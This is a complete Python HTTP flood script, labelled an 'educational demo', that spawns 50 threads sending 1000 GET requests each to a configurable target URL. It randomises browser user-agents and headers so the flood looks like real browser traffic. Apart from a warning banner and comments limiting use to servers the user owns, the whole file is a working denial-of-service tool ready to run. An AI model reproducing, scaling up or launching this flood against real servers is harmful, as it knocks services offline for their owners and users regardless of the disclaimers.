import threading
import requests
import time
import random
from faker import Faker

fake = Faker()

# === CONFIGURATION - CHANGE ONLY IF YOU OWN THE TARGET ===
TARGET_URL = "https://example.com"   # <<<<< YOU MUST OWN THIS DOMAIN
THREADS = 50                         # Number of concurrent threads
REQUESTS_PER_THREAD = 1000           # Requests each thread sends
TIMEOUT = 10                         # HTTP timeout in seconds

# Random User-Agents to mimic real browsers
def random_headers():
    return {
        'User-Agent': fake.user_agent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

# Single worker that sends HTTP GET requests as fast as possible
def http_flood():
    sent = 0
    try:
        while sent < REQUESTS_PER_THREAD:
            try:
                r = requests.get(TARGET_URL, headers=random_headers(), timeout=TIMEOUT)
                if r.status_code == 200:
                    print(f"[+] Thread {threading.current_thread().name} → Success ({r.status_code})")
                else:
                    print(f"[!] Thread {threading.current_thread().name} → {r.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"[-] Thread {threading.current_thread().name} → Error: {e}")
            sent += 1
    except KeyboardInterrupt:
        print(f"[*] Thread {threading.current_thread().name} stopped.")

# Main function
if __name__ == "__main__":
    print(f"""
    === EDUCATIONAL HTTP FLOOD DEMO ===
    Target: {TARGET_URL}
    Threads: {THREADS}
    Requests per thread: {REQUESTS_PER_THREAD}
    Total requests: {THREADS * REQUESTS_PER_THREAD}

    WARNING: Only use this against servers YOU own or have permission to test!
    """)

    input("Press Enter to start the flood (Ctrl+C to stop)...")

    start_time = time.time()

    # Launch threads
    for i in range(THREADS):
        t = threading.Thread(target=http_flood, name=f"T{i+1}")
        t.daemon = True
        t.start()

    try:
        while threading.active_count() > 1:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")

    print(f"\nDone in {time.time() - start_time:.2f} seconds.")
